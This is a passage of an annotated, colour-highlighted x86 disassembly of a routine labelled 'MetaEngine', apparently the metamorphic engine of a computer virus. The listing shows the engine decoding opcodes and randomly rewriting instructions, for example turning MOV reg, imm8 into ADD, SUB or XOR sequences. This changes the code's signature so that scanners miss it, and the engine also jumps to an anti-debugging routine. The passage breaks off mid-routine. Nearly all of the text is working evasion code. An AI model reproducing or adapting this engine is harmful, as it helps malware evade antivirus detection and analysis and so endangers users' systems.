</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0C3h</span>                  <span style="COLOR: white">; RET?
</span>                <span style="COLOR: #c0c0c0">jnb     short </span><span style="COLOR: #ffff00">isD0_D4</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0C0h</span>                  <span style="COLOR: white">; OP r/m8, imm8?
</span>                                                  <span style="COLOR: white">; (RCL/RCR/ROL/ROR/SAL/SAR/SHL/SHR)
</span>                <span style="COLOR: #c0c0c0">jnb     short </span><span style="COLOR: #ffff00">Store3Bytes</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">83h</span>                   <span style="COLOR: white">; OP r/m32, imm8?
</span>                                                  <span style="COLOR: white">; (ADC/ADD/AND/CMP/OR/SBB/SUB/XOR)
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">isD0_D4</span>
                <span style="COLOR: #c0c0c0">mov     ah</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; ah = ModRM
</span>                <span style="COLOR: #c0c0c0">cmp     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0C4h</span>                  <span style="COLOR: white">; ADD ESP, imm8?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">Store3Bytes</span>         <span style="COLOR: white">; avoid
</span>                <span style="COLOR: #c0c0c0">cmp     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0ECh</span>                  <span style="COLOR: white">; SUB ESP, imm8?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">isD0_D4</span>             <span style="COLOR: white">; avoid
</span>
<span style="COLOR: #ffff00">Store3Bytes</span><span style="COLOR: #c0c0c0">:                                      </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+199j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+1A5j
</span>                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">3</span>
                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">StoreBytes</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">isD0_D4</span><span style="COLOR: #c0c0c0">:                                          </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+195j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+19Dj ...
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0D0h</span>                  <span style="COLOR: white">; OP r/m8, imm8?
</span>                                                  <span style="COLOR: white">; (RCL/RCR/ROL/ROR/SAL/SAR/SHL/SHR)
</span>                <span style="COLOR: #c0c0c0">jb      short </span><span style="COLOR: #ffff00">isInt_isMovEbpEsp</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0D4h</span>                  <span style="COLOR: white">; D0 - D3
</span>                <span style="COLOR: #c0c0c0">jb      short </span><span style="COLOR: #ffff00">Store2Bytes</span>         <span style="COLOR: white">; avoid
</span>
<span style="COLOR: #ffff00">isInt_isMovEbpEsp</span><span style="COLOR: #c0c0c0">:                                </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+1B5j
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0CDh</span>                  <span style="COLOR: white">; INT?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">Store2Bytes</span>         <span style="COLOR: white">; avoid
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">8Bh</span>                   <span style="COLOR: white">; MOV r32, r/m32?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">isRep_isF6_isF7</span>
                <span style="COLOR: #c0c0c0">cmp     byte ptr [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0ECh</span>    <span style="COLOR: white">; 8B EC = MOV EBP, ESP
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">CheckRegOpcodeField</span>

<span style="COLOR: #ffff00">isRep_isF6_isF7</span><span style="COLOR: #c0c0c0">:                                  </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+1C1j
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0F3h</span>                  <span style="COLOR: white">; REP prefix?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">Store2Bytes</span>         <span style="COLOR: white">; avoid
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0F6h</span>                  <span style="COLOR: white">; OP r/m8?
</span>                                                  <span style="COLOR: white">; (DIV/IDIV/IMUL/MUL/NEG/NOT/TEST)
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">CheckRegOpcodeField</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0F7h</span>                  <span style="COLOR: white">; OP r/m32?
</span>                                                  <span style="COLOR: white">; (DIV/IDIV/IMUL/MUL/NEG/NOT/TEST)
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">isInt3_Ret_PushReg</span>

<span style="COLOR: #ffff00">CheckRegOpcodeField</span><span style="COLOR: #c0c0c0">:                              </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+1C7j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+1CFj
</span>                <span style="COLOR: #c0c0c0">mov     ah</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; ah = ModRM
</span>                <span style="COLOR: #c0c0c0">and     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111000b</span>               <span style="COLOR: white">; save [reg/opcode] field
</span>                <span style="COLOR: #c0c0c0">cmp     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>                     <span style="COLOR: white">; is it empty?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">isInt3_Ret_PushReg</span>  <span style="COLOR: white">; yes, skip
</span>
<span style="COLOR: #ffff00">Store2Bytes</span><span style="COLOR: #c0c0c0">:                                      </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+1B9j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+1BDj ...
</span>                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">2</span>
                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">StoreBytes</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">isInt3_Ret_PushReg</span><span style="COLOR: #c0c0c0">:                               </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+1D3j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+1DEj
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0CCh</span>                  <span style="COLOR: white">; INT 3?
</span>                <span style="COLOR: #c0c0c0">jz      </span><span style="COLOR: #ffff00">AntiDebug</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0C3h</span>                  <span style="COLOR: white">; RET?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">StoreOneByteOpcode</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">50h</span>                   <span style="COLOR: white">; PUSH r32 / POP r32?
</span>                <span style="COLOR: #c0c0c0">jb      short </span><span style="COLOR: #ffff00">isMovTestRmReg</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">60h</span>                   <span style="COLOR: white">; check if it's between 50 to 60
</span>                <span style="COLOR: #c0c0c0">jnb     short </span><span style="COLOR: #ffff00">isMovTestRmReg</span>

<span style="COLOR: #ffff00">StoreOneByteOpcode</span><span style="COLOR: #c0c0c0">:                               </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+1F1j
</span>                <span style="COLOR: #c0c0c0">movsb                             </span><span style="COLOR: white">; copy one byte from source to destination
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">isMovTestRmReg</span><span style="COLOR: #c0c0c0">:                                   </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+1F5j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+1F9j
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">88h</span>                   <span style="COLOR: white">; MOV r/m8, r8?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">Mutate?</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">89h</span>                   <span style="COLOR: white">; MOV r/m32, r32?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">Mutate?</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">84h</span>                   <span style="COLOR: white">; TEST r/m8, r8?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">Mutate?</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">85h</span>                   <span style="COLOR: white">; TEST r/m32, r32?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">Mutate?</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">40h</span>                   <span style="COLOR: white">; is opcode &lt; 40?
</span>                <span style="COLOR: #c0c0c0">jnb     short </span><span style="COLOR: #ffff00">isMovLeaRegRm</span>
                <span style="COLOR: #c0c0c0">mov     ah</span><span style="COLOR: #c0c0c0">, al</span>                    <span style="COLOR: white">; ah = opcode
</span>                <span style="COLOR: #c0c0c0">and     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111b</span>                  <span style="COLOR: white">; save last 3 bits
</span>                <span style="COLOR: #c0c0c0">cmp     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>                     <span style="COLOR: white">; OP r/m8, r8
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">Mutate?</span>
                <span style="COLOR: #c0c0c0">cmp     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                     <span style="COLOR: white">; OP r/m32, r32?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">isMovLeaRegRm</span>

<span style="COLOR: #ffff00">Mutate?</span><span style="COLOR: #c0c0c0">:                                          </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+203j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+207j ...
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Rnd7</span>                      <span style="COLOR: #c0c0c0">; returns random eax (0 to 7)
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">CheckModRM</span>          <span style="COLOR: white">; mutate if eax = 0 (1/8 probability)
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">StoreDisplacementPlus2</span>    <span style="COLOR: white">; else, skip this instruction
</span><span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">CheckModRM</span><span style="COLOR: #c0c0c0">:                                       </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+229j
</span>                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; cl = ModRM
</span>                <span style="COLOR: #c0c0c0">and     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000000b</span>             <span style="COLOR: white">; save the [mod] field
</span>                <span style="COLOR: #c0c0c0">cmp     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>                     <span style="COLOR: white">; [mod] == 00?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">jmp_Mutate</span>
                <span style="COLOR: #c0c0c0">cmp     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000000b</span>             <span style="COLOR: white">; [mod] == 11?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">jmp_Mutate</span>
                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Random</span>                    <span style="COLOR: white">; get random number
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                     <span style="COLOR: white">; make it 0 or 1
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>                     <span style="COLOR: white">; is it 0?
</span>                <span style="COLOR: #c0c0c0">jz      </span><span style="COLOR: #ffff00">Morph1</span>                    <span style="COLOR: white">; mutate
</span>
<span style="COLOR: #ffff00">jmp_Mutate</span><span style="COLOR: #c0c0c0">:                                       </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+239j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+23Ej
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">Morph2</span>                    <span style="COLOR: white">; mutate
</span><span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">isMovLeaRegRm</span><span style="COLOR: #c0c0c0">:                                    </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+213j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+222j
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">8Ah</span>                   <span style="COLOR: white">; MOV r8, r/m8?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">_Mutate?</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">8Bh</span>                   <span style="COLOR: white">; MOV r32, r/m32?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">_Mutate?</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">8Dh</span>                   <span style="COLOR: white">; LEA r32, mem?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">_Mutate?</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">40h</span>                   <span style="COLOR: white">; is opcode &lt; 40?
</span>                <span style="COLOR: #c0c0c0">jnb     short </span><span style="COLOR: #ffff00">isFE_isFF</span>
                <span style="COLOR: #c0c0c0">mov     ah</span><span style="COLOR: #c0c0c0">, al</span>
                <span style="COLOR: #c0c0c0">and     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111b</span>                  <span style="COLOR: white">; keep last 3 bits
</span>                <span style="COLOR: #c0c0c0">cmp     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">2</span>                     <span style="COLOR: white">; OP r8, r/m8?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">_Mutate?</span>
                <span style="COLOR: #c0c0c0">cmp     ah</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">3</span>                     <span style="COLOR: white">; OP r32, r/m32?
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">isFE_isFF</span>

<span style="COLOR: #ffff00">_Mutate?</span><span style="COLOR: #c0c0c0">:                                         </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+256j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+25Aj ...
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Rnd7</span>                      <span style="COLOR: #c0c0c0">; returns random eax (0 to 7)
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">_CheckModRM</span>         <span style="COLOR: white">; mutate if eax = 0 (1/8 probability)
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">StoreDisplacementPlus2</span>    <span style="COLOR: white">; else, skip this instruction
</span><span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">_CheckModRM</span><span style="COLOR: #c0c0c0">:                                      </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+278j
</span>                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; cl = ModRM
</span>                <span style="COLOR: #c0c0c0">and     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000000b</span>             <span style="COLOR: white">; save the [mod] field
</span>                <span style="COLOR: #c0c0c0">cmp     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>                     <span style="COLOR: white">; [mod] == 00?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">_jmp_Mutate</span>
                <span style="COLOR: #c0c0c0">cmp     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000000b</span>             <span style="COLOR: white">; [mod] == 11?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">_jmp_Mutate</span>
                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Random</span>                    <span style="COLOR: white">; get random number
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">1</span>                     <span style="COLOR: white">; make it 1 or 0
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>                     <span style="COLOR: white">; is it zero?
</span>                <span style="COLOR: #c0c0c0">jz      </span><span style="COLOR: #ffff00">Morph1</span>                    <span style="COLOR: white">; mutate
</span>
<span style="COLOR: #ffff00">_jmp_Mutate</span><span style="COLOR: #c0c0c0">:                                      </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+288j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+28Dj
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">Morph3</span>                    <span style="COLOR: white">; mutate
</span><span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">isFE_isFF</span><span style="COLOR: #c0c0c0">:                                        </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+262j
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+271j
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0FEh</span>                  <span style="COLOR: white">; INC/DEC r/m8?
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">MakeMovRegPushReg</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0FFh</span>                  <span style="COLOR: white">; OP r/m32?
</span>                                                  <span style="COLOR: white">; (INC/DEC/JMP/CALL/PUSH)
</span>                <span style="COLOR: #c0c0c0">jnz     short </span><span style="COLOR: #ffff00">isMovReg8Imm8?</span>

<span style="COLOR: #ffff00">MakeMovRegPushReg</span><span style="COLOR: #c0c0c0">:                                </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+2A5j
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; al = ModRM
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111000b</span>               <span style="COLOR: white">; keep the [reg/opcode] field
</span>                <span style="COLOR: #c0c0c0">ror     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">3</span>                     <span style="COLOR: white">; place it in the [reg] field
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">111b</span>                  <span style="COLOR: white">; opcode == 111?
</span>                <span style="COLOR: #c0c0c0">jz      </span><span style="COLOR: #ffff00">AbortEngine</span>               <span style="COLOR: white">; exit engine
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">110b</span>                  <span style="COLOR: white">; opcode != 110 (PUSH)?
</span>                <span style="COLOR: #c0c0c0">jnz     </span><span style="COLOR: #ffff00">StoreDisplacementPlus2</span>    <span style="COLOR: white">; skip
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">8Bh</span>                   <span style="COLOR: white">; Generate MOV EAX, r/m32
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [esi+</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; al = ModRM
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000111b</span>             <span style="COLOR: white">; keep [mod] and [reg] fields
</span>                                                  <span style="COLOR: white">; set [reg/opcode] = 000
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store ModRM byte
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">CheckDisplacement</span>         <span style="COLOR: #c0c0c0">; returns cl: 0, 1 or 4
</span>                <span style="COLOR: #c0c0c0">add     esi</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">2</span>                    <span style="COLOR: white">; increase code counter by 2
</span>                <span style="COLOR: #c0c0c0">rep movsb                         </span><span style="COLOR: white">; store address
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">50h</span>                   <span style="COLOR: white">; Generate PUSH EAX
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">isMovReg8Imm8?</span><span style="COLOR: #c0c0c0">:                                   </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+2A9j
</span>                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0B0h</span>                  <span style="COLOR: white">; MOV r8, imm8?
</span>                <span style="COLOR: #c0c0c0">jb      short </span><span style="COLOR: #ffff00">isMovReg32Imm32</span>
                <span style="COLOR: #c0c0c0">cmp     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0B8h</span>                  <span style="COLOR: white">; check if it's between B0 to B8
</span>                <span style="COLOR: #c0c0c0">jnb     short </span><span style="COLOR: #ffff00">isMovReg32Imm32</span>
                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Rnd7</span>                      <span style="COLOR: #c0c0c0">; returns random eax (0 to 7)
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">MakeAddRegRandom8</span>   <span style="COLOR: white">; mutate?
</span>                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">2</span>                     <span style="COLOR: white">; skip
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">StoreBytes</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeAddRegRandom8</span><span style="COLOR: #c0c0c0">:                                </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+2EBj
</span>                                                  <span style="COLOR: #00ff00">; MetaEngine+2FBj
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Random</span>                    <span style="COLOR: white">; get random
</span>                <span style="COLOR: #c0c0c0">and     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11b</span>                   <span style="COLOR: white">; make it between 1 - 3
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">MakeAddRegRandom8</span>   <span style="COLOR: white">; if it's zero, try again
</span>                <span style="COLOR: #c0c0c0">mov     dh</span><span style="COLOR: #c0c0c0">, al</span>                    <span style="COLOR: white">; dh = random selection
</span>                <span style="COLOR: #c0c0c0">movsb                             </span><span style="COLOR: white">; store opcode
</span>                <span style="COLOR: #c0c0c0">call    </span><span style="COLOR: #ffff00">Random</span>                    <span style="COLOR: white">; get random number
</span>                <span style="COLOR: #c0c0c0">mov     cl</span><span style="COLOR: #c0c0c0">, al</span>                    <span style="COLOR: white">; save it in CL
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store random byte
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">80h</span>                   <span style="COLOR: white">; al = ADC/ADD/AND/CMP/OR/SBB/SUB/XOR
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store operation
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, [esi-</span><span style="COLOR: #00ffff">1</span><span style="COLOR: #c0c0c0">]</span>               <span style="COLOR: white">; get original instruction opcode
</span>                <span style="COLOR: #c0c0c0">sub     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0B0h</span>                  <span style="COLOR: white">; subtract opcode, al = register used
</span>                <span style="COLOR: #c0c0c0">cmp     dh</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">2</span>                     <span style="COLOR: white">; if random == 2, Generate SUB
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">MakeSubRegRandom8</span>
                <span style="COLOR: #c0c0c0">cmp     dh</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">3</span>                     <span style="COLOR: white">; if random == 3, Generate XOR
</span>                <span style="COLOR: #c0c0c0">jz      short </span><span style="COLOR: #ffff00">MakeXorRegRandom8</span>
                <span style="COLOR: #c0c0c0">or      al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11000000b</span>             <span style="COLOR: white">; Generate ADD (ModRM = 11 000 reg)
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store ModRM
</span>                <span style="COLOR: #c0c0c0">lodsb                             </span><span style="COLOR: white">; load the original immediate value
</span>                <span style="COLOR: #c0c0c0">sub     al</span><span style="COLOR: #c0c0c0">, cl</span>                    <span style="COLOR: white">; subtract the random value
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store
</span>                <span style="COLOR: #c0c0c0">jmp     </span><span style="COLOR: #ffff00">LoadInstruction</span>
<span style="COLOR: #c0c0c0">; ___________________________________________________________________________
</span>
<span style="COLOR: #ffff00">MakeSubRegRandom8</span><span style="COLOR: #c0c0c0">:                                </span><span style="COLOR: #00ff00">; CODE XREF: MetaEngine+313j
</span>                <span style="COLOR: #c0c0c0">or      al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">11101000b</span>             <span style="COLOR: white">; Generate SUB (ModRM = 11 101 reg)
</span>                <span style="COLOR: #c0c0c0">stosb                             </span><span style="COLOR: white">; store ModRM
</span>                <span style="COLOR: #c0c0c0">lodsb                             </span><span style="COLOR: white">; load the original immediate value
</span>                <span style="COLOR: #c0c0c0">sub     al</span><span style="COLOR: #c0c0c0">, cl</span>                    <span style="COLOR: white">; al -= random value
</span>                <span style="COLOR: #c0c0c0">mov     ah</span><span style="COLOR: #c0c0c0">, al</span>                    <span style="COLOR: white">; save al in ah
</span>                <span style="COLOR: #c0c0c0">mov     al</span><span style="COLOR: #c0c0c0">, </span><span style="COLOR: #00ffff">0</span>
